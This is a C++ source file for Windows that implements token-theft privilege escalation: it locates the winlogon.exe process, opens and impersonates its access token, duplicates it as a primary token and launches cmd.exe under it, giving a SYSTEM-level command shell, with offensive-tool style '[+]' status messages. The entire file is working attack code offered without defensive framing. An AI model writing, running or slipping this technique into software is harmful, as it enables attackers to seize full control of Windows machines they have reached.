#include <windows.h>
#include <iostream>
#include <cstdio>
#include <tlhelp32.h>
#include <Lmcons.h>

std::string get_username() {
	WCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

int GetProcessByName(PCWSTR name) {
	DWORD pid = 0;

	// Create toolhelp snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,
		0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32First(snapshot, &process)) {
		do {
			// Compare process.szExeFile based on format of name, i.e.,
			// trim file path
			// trim .exe if necessary, etc.
			if (wcscmp(process.szExeFile, name) == 0) {
				return process.th32ProcessID;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return NULL;
}

int main(int argc, char** argv) {
	// Print whoami to compare to thread later
	printf("[+] Current user is: %s\n", get_username().c_str());

	// Searching for Winlogon PID 
	DWORD WinlogonPID = GetProcessByName(L"winlogon.exe");
	if (WinlogonPID == NULL) {
		printf("[-] Winlogon process not found\n");
		getchar();
		exit(1);
	}
	printf("[+] Winlogon process (%ld) found!\n", WinlogonPID);

	// Call OpenProcess() to open WINLOGON, print return code and error code
	HANDLE WinlogonHANDLE = OpenProcess(
		PROCESS_QUERY_LIMITED_INFORMATION,
		true, WinlogonPID);
	if (GetLastError() == NULL)
		printf("[+] WINLOGON OpenProcess() success!\n");
	else {
		printf("[-] WINLOGON OpenProcess() Return Code: %i\n", 
			WinlogonHANDLE);
		printf("[-] WINLOGON OpenProcess() Error: %i\n", 
			GetLastError());
		getchar();
		exit(1);
	}

	// Call OpenProcessToken(), print return code and error code
	HANDLE WinlogonTokenHandle = NULL;
	BOOL getToken = OpenProcessToken(WinlogonHANDLE,
		TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, 
		&WinlogonTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] WINLOGON OpenProcessToken() success!\n");
	else {
		printf("[-] WINLOGON OpenProcessToken() Return Code: %i\n",
			getToken);
		printf("[-] WINLOGON OpenProcessToken() Error: %i\n", 
			GetLastError());
		getchar();
		exit(1);
	}

	// Impersonate user in a thread
	ImpersonateLoggedOnUser(WinlogonTokenHandle);
	if (GetLastError() == NULL) {
		printf("[+] WINLOGON ImpersonatedLoggedOnUser() success!\n");
		printf("[+] WINLOGON Current user is: %s\n", 
			get_username().c_str());
	}
	else {
		printf("[-] WINLOGON ImpersonatedLoggedOnUser() Return Code: %i\n", 
			getToken);
		printf("[-] WINLOGON ImpersonatedLoggedOnUser() Error: %i\n", 
			GetLastError());
		getchar();
		exit(1);
	}
	CloseHandle(WinlogonHANDLE);
	
	HANDLE pNewToken = new HANDLE;
	if (!DuplicateTokenEx(WinlogonTokenHandle, MAXIMUM_ALLOWED,
		NULL, SecurityImpersonation, TokenPrimary,
		&pNewToken)) {
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", 
			GetLastError());
		getchar();
		exit(1);
	}
	
	STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};
	BOOL ret = CreateProcessWithTokenW(pNewToken, 
		LOGON_NETCREDENTIALS_ONLY,
		L"C:\\Windows\\System32\\cmd.exe", NULL,
		CREATE_NEW_CONSOLE, NULL, NULL,
		&si, &pi);
	if (!ret) {
		wprintf(L"CreateProcessWithTokenW: %d\n", GetLastError());
		return 1;
	}
	CloseHandle(WinlogonTokenHandle);
	getchar();
	return 0;
}


